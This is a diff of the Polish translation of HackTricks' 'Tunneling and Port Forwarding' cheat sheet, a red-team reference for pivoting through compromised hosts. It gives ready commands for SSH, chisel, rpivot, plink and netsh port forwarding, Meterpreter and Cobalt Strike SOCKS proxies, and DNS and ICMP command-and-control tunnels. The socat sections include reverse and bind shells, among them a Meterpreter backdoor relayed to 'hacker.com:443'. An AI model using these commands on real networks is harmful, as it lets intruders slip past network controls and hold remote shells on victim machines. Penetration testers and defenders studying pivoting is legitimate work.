@@ -1,18 +1,21 @@
-# Tunelowanie i Przekierowywanie Portów
+# Tunneling and Port Forwarding
+
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>Nauka hakowania AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-* Czy pracujesz w **firmie z branży cyberbezpieczeństwa**? Chcesz zobaczyć swoją **firmę reklamowaną na HackTricks**? lub chcesz mieć dostęp do **najnowszej wersji PEASS lub pobrać HackTricks w formacie PDF**? Sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
-* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
-* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
-* **Dołącz do** [**💬**](https://emojipedia.org/speech-balloon/) [**Grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** mnie na **Twitterze** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Podziel się swoimi sztuczkami hakowania, przesyłając PR-y do [repozytorium hacktricks](https://github.com/carlospolop/hacktricks) i [repozytorium hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
 
-**Grupa Try Hard Security**
+**Try Hard Security Group**
 
 <figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
@@ -20,15 +23,15 @@
 
 ***
 
-## Wskazówka dotycząca Nmap
+## Nmap tip
 
 {% hint style="warning" %}
-**Skanowanie ICMP** i **SYN** nie może być tunelowane przez proxy SOCKS, dlatego musimy **wyłączyć odkrywanie pingów** (`-Pn`) i określić **skany TCP** (`-sT`), aby to działało.
+**Skanowanie ICMP** i **SYN** nie mogą być tunelowane przez proxy socks, więc musimy **wyłączyć odkrywanie ping** (`-Pn`) i określić **skanowanie TCP** (`-sT`), aby to działało.
 {% endhint %}
 
 ## **Bash**
 
-**Host -> Skok -> WewnętrznyA -> WewnętrznyB**
+**Host -> Jump -> InternalA -> InternalB**
 ```bash
 # On the jump server connect the port 3333 to the 5985
 mknod backpipe p;
@@ -46,11 +49,11 @@ evil-winrm -u username -i Jump
 ```
 ## **SSH**
 
-Graficzne połączenie SSH (X)
+SSH graficzne połączenie (X)
 ```bash
 ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
 ```
-### Lokalne przekierowanie portów
+### Local Port2Port
 
 Otwórz nowy port na serwerze SSH --> Inny port
 ```bash
@@ -62,7 +65,7 @@ ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in
 ```
 ### Port2Port
 
-Lokalny port --> Skompromitowany host (SSH) --> Trzecia\_skrzynka:Port
+Lokalny port --> Skompromitowany host (SSH) --> Trzecia\_maszyna:Port
 ```bash
 ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
 #Example
@@ -70,13 +73,13 @@ sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
 ```
 ### Port2hostnet (proxychains)
 
-Port lokalny --> Skompromitowany host (SSH) --> Gdziekolwiek
+Lokalny port --> Skompromitowany host (SSH) --> Gdziekolwiek
 ```bash
 ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
 ```
-### Odwrócone przekierowywanie portów
+### Reverse Port Forwarding
 
-Jest to przydatne do uzyskiwania odwróconych powłok z wewnętrznych hostów przez strefę zdemilitaryzowaną (DMZ) do Twojego hosta:
+To jest przydatne do uzyskiwania odwrotnych powłok z wewnętrznych hostów przez DMZ do twojego hosta:
 ```bash
 ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
 # Now you can send a rev to dmz_internal_ip:443 and caputure it in localhost:7000
@@ -85,9 +88,9 @@ ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
 # and change the line "GatewayPorts no" to "GatewayPorts yes"
 # to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
 ```
-### Tunel VPN
+### VPN-Tunnel
 
-Potrzebujesz **uprawnień root na obu urządzeniach** (ponieważ będziesz tworzyć nowe interfejsy) i konfiguracja sshd musi zezwalać na logowanie jako root:\
+Potrzebujesz **roota na obu urządzeniach** (ponieważ zamierzasz utworzyć nowe interfejsy) i konfiguracja sshd musi zezwalać na logowanie jako root:\
 `PermitRootLogin yes`\
 `PermitTunnel yes`
 ```bash
@@ -97,7 +100,7 @@ ifconfig tun0 up #Activate the client side network interface
 ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
 ifconfig tun0 up #Activate the server side network interface
 ```
-Włącz przekierowywanie po stronie serwera
+Włącz przekazywanie po stronie serwera
 ```bash
 echo 1 > /proc/sys/net/ipv4/ip_forward
 iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
@@ -108,8 +111,8 @@ route add -net 10.0.0.0/16 gw 1.1.1.1
 ```
 ## SSHUTTLE
 
-Możesz **tunelować** cały **ruch** do **podsieci** za pośrednictwem hosta przy użyciu **ssh**.\
-Na przykład przekierowanie całego ruchu idącego do 10.10.10.0/24
+Możesz **tunnel** przez **ssh** cały **ruch** do **podsieci** przez hosta.\
+Na przykład, przekierowując cały ruch kierujący się do 10.10.10.0/24
 ```bash
 pip install sshuttle
 sshuttle -r user@host 10.10.10.10/24
@@ -123,14 +126,12 @@ sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
 
 ### Port2Port
 
-Port lokalny --> Skompromitowany host (aktywna sesja) --> Trzecia\_skrzynka:Port
+Lokalny port --> Skompromitowany host (aktywna sesja) --> Trzecia\_skrzynka:Port
 ```bash
 # Inside a meterpreter session
 portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
 ```
 ### SOCKS
-
-SOCKS (Socket Secure) jest protokołem internetowym, który umożliwia przekierowywanie ruchu sieciowego między klientem a serwerem za pośrednictwem serwera pośredniczącego. SOCKS jest przydatny do tunelowania ruchu sieciowego, umożliwiając ukrycie prawdziwego źródła ruchu.
 ```bash
 background# meterpreter session
 route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
@@ -151,9 +152,11 @@ set VERSION 4a
 run #Proxy port 1080 by default
 echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
 ```
-### Proxy SOCKS
+## Cobalt Strike
 
-Otwórz port w teamserverze nasłuchującym na wszystkich interfejsach, które mogą być użyte do **kierowania ruchem przez beacon**.
+### SOCKS proxy
+
+Otwórz port w serwerze zespołu nasłuchujący na wszystkich interfejsach, który może być użyty do **przekierowania ruchu przez beacon**.
 ```bash
 beacon> socks 1080
 [+] started SOCKS4a server on: 1080
@@ -164,16 +167,22 @@ proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
 ### rPort2Port
 
 {% hint style="warning" %}
-W tym przypadku **port jest otwarty w hostu bieżącym**, a nie w Serwerze Zespołu, a ruch jest wysyłany do Serwera Zespołu, a stamtąd do wskazanego hosta:port
+W tym przypadku **port jest otwarty w hoście beacon**, a nie w serwerze zespołu, a ruch jest wysyłany do serwera zespołu, a stamtąd do wskazanego hosta:port
 {% endhint %}
 ```bash
 rportfwd [bind port] [forward host] [forward port]
 rportfwd stop [bind port]
 ```
+Do zauważenia:
+
+- Odwrócone przekierowanie portów Beacona jest zaprojektowane do **tunnelingu ruchu do Serwera Zespołu, a nie do przekazywania między poszczególnymi maszynami**.
+- Ruch jest **tunnelowany w ramach ruchu C2 Beacona**, w tym linków P2P.
+- **Uprawnienia administratora nie są wymagane** do tworzenia odwróconych przekierowań portów na wysokich portach.
+
 ### rPort2Port lokalnie
 
 {% hint style="warning" %}
-W tym przypadku **port jest otwarty na hoście Beacon**, a nie na Serwerze Zespołu, a **ruch jest wysyłany do klienta Cobalt Strike** (a nie do Serwera Zespołu) i stamtąd do wskazanego hosta:port
+W tym przypadku **port jest otwierany w hoście beacona**, a nie w Serwerze Zespołu, a **ruch jest wysyłany do klienta Cobalt Strike** (a nie do Serwera Zespołu) i stamtąd do wskazanego hosta:port
 {% endhint %}
 ```
 rportfwd_local [bind port] [forward host] [forward port]
@@ -183,16 +192,16 @@ rportfwd_local stop [bind port]
 
 [https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)
 
-Musisz przesłać plik tunelu sieciowego: ashx|aspx|js|jsp|php|php|jsp
+Musisz przesłać plik tunelowy: ashx|aspx|js|jsp|php|php|jsp
 ```bash
 python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
 ```
-## Dłuto
+## Chisel
 
-Możesz pobrać go ze strony wydań [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
-Musisz użyć **tej samej wersji dla klienta i serwera**
+Możesz go pobrać z strony wydań [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
+Musisz używać **tej samej wersji dla klienta i serwera**
 
-### skarpeta
+### socks
 ```bash
 ./chisel server -p 8080 --reverse #Server -- Attacker
 ./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
@@ -201,7 +210,7 @@ Musisz użyć **tej samej wersji dla klienta i serwera**
 ./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
 ./chisel client -v 10.10.10.10:8080 socks #Attacker
 ```
-### Przekierowywanie portów
+### Przekierowanie portów
 ```bash
 ./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
 ./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
@@ -210,8 +219,8 @@ Musisz użyć **tej samej wersji dla klienta i serwera**
 
 [https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)
 
-Odwrócony tunel. Tunel jest uruchamiany od ofiary.\
-Proxy socks4 jest tworzone na 127.0.0.1:1080
+Odwrócony tunel. Tunel jest uruchamiany z ofiary.\
+Tworzony jest proxy socks4 na 127.0.0.1:1080
 ```bash
 attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
 ```
@@ -219,7 +228,7 @@ attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127
 ```bash
 victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
 ```
-Przejdź przez **serwer proxy NTLM**
+Pivot through **NTLM proxy**
 ```bash
 victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
 ```
@@ -231,12 +240,12 @@ victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntl
 
 [https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)
 
-### Powiązany shell
+### Shell powiązany
 ```bash
 victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
 attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
 ```
-### Odwrócony shell
+### Reverse shell
 ```bash
 attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
 victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
@@ -245,11 +254,11 @@ victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
 ```bash
 socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
 ```
-### Port2Port przez skarpety
+### Port2Port przez socks
 ```bash
 socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
 ```
-### Meterpreter poprzez SSL Socat
+### Meterpreter przez SSL Socat
 ```bash
 #Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
 attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
@@ -259,17 +268,17 @@ attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,f
 victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
 #Execute the meterpreter
 ```
-Możesz ominąć **nieuwierzytelniony proxy** wykonując tę linię zamiast ostatniej w konsoli ofiary:
+Możesz obejść **proxy bez uwierzytelnienia**, wykonując tę linię zamiast ostatniej w konsoli ofiary:
 ```bash
 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
 ```
 [https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)
 
-### Tunel SSL za pomocą Socat
+### Tunel SSL Socat
 
-**Konsola /bin/sh**
+**/bin/sh konsola**
 
-Utwórz certyfikaty po obu stronach: Klienta i Serwera
+Utwórz certyfikaty po obu stronach: Klient i Serwer
 ```bash
 # Execute these commands on both sides
 FILENAME=socatssl
@@ -283,7 +292,7 @@ chmod 600 $FILENAME.key $FILENAME.pem
 attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
 victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
 ```
-### Zdalne przekierowanie portu do portu
+### Remote Port2Port
 
 Połącz lokalny port SSH (22) z portem 443 hosta atakującego
 ```bash
@@ -293,9 +302,9 @@ attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh o
 ```
 ## Plink.exe
 
-To jest wersja konsolowa PuTTY (opcje są bardzo podobne do klienta ssh).
+To jak konsolowa wersja PuTTY (opcje są bardzo podobne do klienta ssh).
 
-Ponieważ ten plik binarny będzie wykonywany u ofiary i jest to klient ssh, musimy otworzyć naszą usługę ssh i port, abyśmy mogli uzyskać odwrotność połączenia. Następnie, aby przekierować tylko lokalnie dostępny port do portu na naszej maszynie:
+Ponieważ ten plik binarny będzie wykonywany na ofierze i jest klientem ssh, musimy otworzyć naszą usługę ssh i port, abyśmy mogli uzyskać połączenie zwrotne. Następnie, aby przekierować tylko lokalnie dostępny port na port w naszej maszynie:
 ```bash
 echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
 echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
@@ -319,36 +328,36 @@ netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
 Musisz mieć **dostęp RDP do systemu**.\
 Pobierz:
 
-1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - To narzędzie wykorzystuje `Dynamic Virtual Channels` (`DVC`) z funkcji usługi Pulpitu Zdalnego systemu Windows. DVC jest odpowiedzialny za **tunelowanie pakietów przez połączenie RDP**.
+1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - To narzędzie wykorzystuje `Dynamic Virtual Channels` (`DVC`) z funkcji Zdalnego Pulpitu w systemie Windows. DVC odpowiada za **tunneling pakietów przez połączenie RDP**.
 2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)
 
-Na komputerze klienta załaduj **`SocksOverRDP-Plugin.dll`** w ten sposób:
+Na swoim komputerze klienckim załaduj **`SocksOverRDP-Plugin.dll`** w ten sposób:
 ```bash
 # Load SocksOverRDP.dll using regsvr32.exe
 C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
 ```
-Teraz możemy **połączyć** się z **ofiarą** za pomocą **RDP** używając **`mstsc.exe`**, i powinniśmy otrzymać **komunikat**, że wtyczka **SocksOverRDP jest włączona**, i będzie **nasłuchiwać** na **127.0.0.1:1080**.
+Teraz możemy **połączyć** się z **ofiarą** za pomocą **RDP** używając **`mstsc.exe`**, i powinniśmy otrzymać **komunikat** informujący, że **plugin SocksOverRDP jest włączony**, i będzie **nasłuchiwać** na **127.0.0.1:1080**.
 
-**Połącz** się za pomocą **RDP** i przesłać oraz uruchomić na maszynie ofiary plik binarny `SocksOverRDP-Server.exe`:
+**Połącz** się przez **RDP** i prześlij oraz uruchom na maszynie ofiary binarny plik `SocksOverRDP-Server.exe`:
 ```
 C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
 ```
-Teraz potwierdź na swoim komputerze (atakującym), że port 1080 nasłuchuje:
+Teraz potwierdź na swojej maszynie (atakującego), że port 1080 nasłuchuje:
 ```
 netstat -antb | findstr 1080
 ```
-Teraz możesz użyć [**Proxifier**](https://www.proxifier.com/) **do przekierowania ruchu przez ten port.**
+Teraz możesz użyć [**Proxifier**](https://www.proxifier.com/) **do proxy ruchu przez ten port.**
 
-## Proxify Aplikacje GUI w systemie Windows
+## Proxify aplikacje GUI Windows
 
-Możesz sprawić, że aplikacje GUI w systemie Windows będą korzystać z proxy za pomocą [**Proxifier**](https://www.proxifier.com/).\
-W **Profil -> Serwery Proxy** dodaj IP i port serwera SOCKS.\
-W **Profil -> Reguły Proksyfikacji** dodaj nazwę programu do proksyfikacji oraz połączenia do adresów IP, które chcesz proksyfikować.
+Możesz sprawić, że aplikacje GUI Windows będą korzystać z proxy za pomocą [**Proxifier**](https://www.proxifier.com/).\
+W **Profile -> Proxy Servers** dodaj IP i port serwera SOCKS.\
+W **Profile -> Proxification Rules** dodaj nazwę programu do proxowania oraz połączenia do IP, które chcesz proxować.
 
 ## Ominięcie proxy NTLM
 
 Wcześniej wspomniane narzędzie: **Rpivot**\
-**OpenVPN** może również je ominąć, ustawiając te opcje w pliku konfiguracyjnym:
+**OpenVPN** może również to obejść, ustawiając te opcje w pliku konfiguracyjnym:
 ```bash
 http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
 ```
@@ -356,8 +365,8 @@ http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
 
 [http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)
 
-Autoryzuje się przeciwko serwerowi proxy i wiąże lokalny port, który jest przekierowany do określonej usługi zewnętrznej. Następnie możesz korzystać z wybranego narzędzia za pośrednictwem tego portu.\
-Na przykład przekierowuje port 443
+Uwierzytelnia się w stosunku do proxy i wiąże lokalny port, który jest przekazywany do zewnętrznej usługi, którą określisz. Następnie możesz używać narzędzia według własnego wyboru przez ten port.\
+Na przykład, aby przekazać port 443
 ```
 Username Alice
 Password P@ssw0rd
@@ -365,20 +374,20 @@ Domain CONTOSO.COM
 Proxy 10.0.0.10:8080
 Tunnel 2222:<attackers_machine>:443
 ```
-Teraz, jeśli ustawisz na przykład na ofierze usługę **SSH** do nasłuchiwania na porcie 443. Możesz się do niej podłączyć przez port 2222 atakującego.\
+Teraz, jeśli ustawisz na przykład w ofierze usługę **SSH** do nasłuchiwania na porcie 443. Możesz się z nią połączyć przez port atakującego 2222.\
 Możesz również użyć **meterpreter**, który łączy się z localhost:443, a atakujący nasłuchuje na porcie 2222.
 
 ## YARP
 
 Odwrócony proxy stworzony przez Microsoft. Możesz go znaleźć tutaj: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)
 
-## Tunelowanie DNS
+## DNS Tunneling
 
 ### Iodine
 
 [https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)
 
-W obu systemach wymagane jest posiadanie uprawnień roota do tworzenia adapterów tun i tunelowania danych między nimi za pomocą zapytań DNS.
+Root jest potrzebny w obu systemach, aby utworzyć adaptery tunelowe i tunelować dane między nimi za pomocą zapytań DNS.
 ```
 attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
 victim> iodine -f -P P@ssw0rd tunneldomain.com -r
@@ -390,9 +399,9 @@ ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
 ```
 ### DNSCat2
 
-[**Pobierz go stąd**](https://github.com/iagox86/dnscat2)**.**
+[**Pobierz stąd**](https://github.com/iagox86/dnscat2)**.**
 
-Ustanawia kanał C\&C poprzez DNS. Nie wymaga uprawnień root.
+Ustanawia kanał C\&C przez DNS. Nie wymaga uprawnień roota.
 ```bash
 attacker> ruby ./dnscat2.rb tunneldomain.com
 victim> ./dnscat2 tunneldomain.com
@@ -403,19 +412,19 @@ victim> ./dnscat2 --dns host=10.10.10.10,port=5353
 ```
 #### **W PowerShell**
 
-Możesz użyć [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell), aby uruchomić klienta dnscat2 w PowerShell:
+Możesz użyć [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell), aby uruchomić klienta dnscat2 w powershell:
 ```
 Import-Module .\dnscat2.ps1
 Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
 ```
-#### **Przekierowywanie portów za pomocą dnscat**
+#### **Przekierowanie portów z dnscat**
 ```bash
 session -i <sessions_id>
 listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
 ```
-#### Zmiana DNS w proxychains
+#### Zmień DNS w proxychains
 
-Proxychains przechwytuje wywołanie biblioteki `gethostbyname` i tuneluje żądanie tcp DNS przez proxy socks. Domyślnie serwer DNS, którego używa proxychains to **4.2.2.2** (zahardcodowany). Aby go zmienić, edytuj plik: _/usr/lib/proxychains3/proxyresolv_ i zmień IP. Jeśli pracujesz w środowisku **Windows**, możesz ustawić IP **kontrolera domeny**.
+Proxychains przechwytuje wywołanie `gethostbyname` w libc i tuneluje żądanie DNS tcp przez proxy socks. Domyślnie serwer DNS, który używa proxychains, to **4.2.2.2** (wpisany na stałe). Aby go zmienić, edytuj plik: _/usr/lib/proxychains3/proxyresolv_ i zmień adres IP. Jeśli jesteś w środowisku **Windows**, możesz ustawić adres IP **kontrolera domeny**.
 
 ## Tunelowanie w Go
 
@@ -428,7 +437,7 @@ Proxychains przechwytuje wywołanie biblioteki `gethostbyname` i tuneluje żąda
 [https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
 [https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)
 
-W obu systemach wymagane jest posiadanie uprawnień roota do utworzenia adapterów tun i tunelowania danych między nimi za pomocą żądań echo ICMP.
+Root jest potrzebny w obu systemach, aby utworzyć adaptery tunelowe i tunelować dane między nimi za pomocą żądań echo ICMP.
 ```bash
 ./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
 ./hans -f -c <server_ip> -p P@ssw0rd -v
@@ -436,7 +445,7 @@ ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.1
 ```
 ### ptunnel-ng
 
-[**Pobierz go stąd**](https://github.com/utoni/ptunnel-ng.git).
+[**Pobierz stąd**](https://github.com/utoni/ptunnel-ng.git).
 ```bash
 # Generate it
 sudo ./autogen.sh
@@ -452,13 +461,13 @@ ssh -D 9050 -p 2222 -l user 127.0.0.1
 ```
 ## ngrok
 
-**[ngrok](https://ngrok.com/) to narzędzie do wystawiania rozwiązań w Internecie za pomocą jednej linii poleceń.**
-*URI wystawienia wyglądają jak:* **UID.ngrok.io**
+**[ngrok](https://ngrok.com/) to narzędzie do eksponowania rozwiązań w Internecie w jednej linii poleceń.**
+*URI ekspozycji są jak:* **UID.ngrok.io**
 
 ### Instalacja
 
 - Utwórz konto: https://ngrok.com/signup
-- Pobierz klient:
+- Pobierz klienta:
 ```bash
 tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
 chmod a+x ./ngrok
@@ -469,9 +478,9 @@ chmod a+x ./ngrok
 
 **Dokumentacja:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).
 
-*Jest również możliwe dodanie uwierzytelnienia i TLS, jeśli jest to konieczne.*
+*Możliwe jest również dodanie uwierzytelniania i TLS, jeśli to konieczne.*
 
-#### Tunelowanie TCP
+#### Tunneling TCP
 ```bash
 # Pointing to 0.0.0.0:4444
 ./ngrok tcp 4444
@@ -479,28 +488,28 @@ chmod a+x ./ngrok
 # Listen (example): nc -nvlp 4444
 # Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
 ```
-#### Ujawnianie plików za pomocą protokołu HTTP
+#### Udostępnianie plików za pomocą HTTP
 ```bash
 ./ngrok http file:///tmp/httpbin/
 # Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
 ```
-#### Podsłuchiwanie wywołań HTTP
+#### Sniffing HTTP calls
 
-*Przydatne dla XSS, SSRF, SSTI ...*
+*Przydatne do XSS, SSRF, SSTI ...*
 Bezpośrednio z stdout lub w interfejsie HTTP [http://127.0.0.1:4040](http://127.0.0.1:4000).
 
-#### Tunelowanie wewnętrznego serwisu HTTP
+#### Tunneling internal HTTP service
 ```bash
 ./ngrok http localhost:8080 --host-header=rewrite
 # Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
 # With basic auth
 ./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
 ```
-#### Przykład prostiej konfiguracji ngrok.yaml
+#### ngrok.yaml prosty przykład konfiguracji
 
 Otwiera 3 tunele:
 - 2 TCP
-- 1 HTTP z wystawianiem statycznych plików z /tmp/httpbin/
+- 1 HTTP z ekspozycją statycznych plików z /tmp/httpbin/
 ```yaml
 tunnels:
 mytcp:
@@ -526,14 +535,17 @@ addr: file:///tmp/httpbin/
 
 ***
 
+{% hint style="success" %}
+Ucz się i ćwicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Ucz się i ćwicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Zacznij od zera i zostań ekspertem AWS w dziedzinie hakerskiej z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Wsparcie dla HackTricks</summary>
 
-* Czy pracujesz w **firmie zajmującej się cyberbezpieczeństwem**? Chcesz zobaczyć, jak Twoja **firma jest reklamowana w HackTricks**? lub chcesz mieć dostęp do **najnowszej wersji PEASS lub pobrać HackTricks w formacie PDF**? Sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
-* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
-* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
-* **Dołącz do** [**💬**](https://emojipedia.org/speech-balloon/) [**Grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** mnie na **Twitterze** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do [repozytorium hacktricks](https://github.com/carlospolop/hacktricks) i [repozytorium hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.
+* Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
+* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Dziel się trikami hackingowymi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów na githubie.
 
 </details>
+{% endhint %}
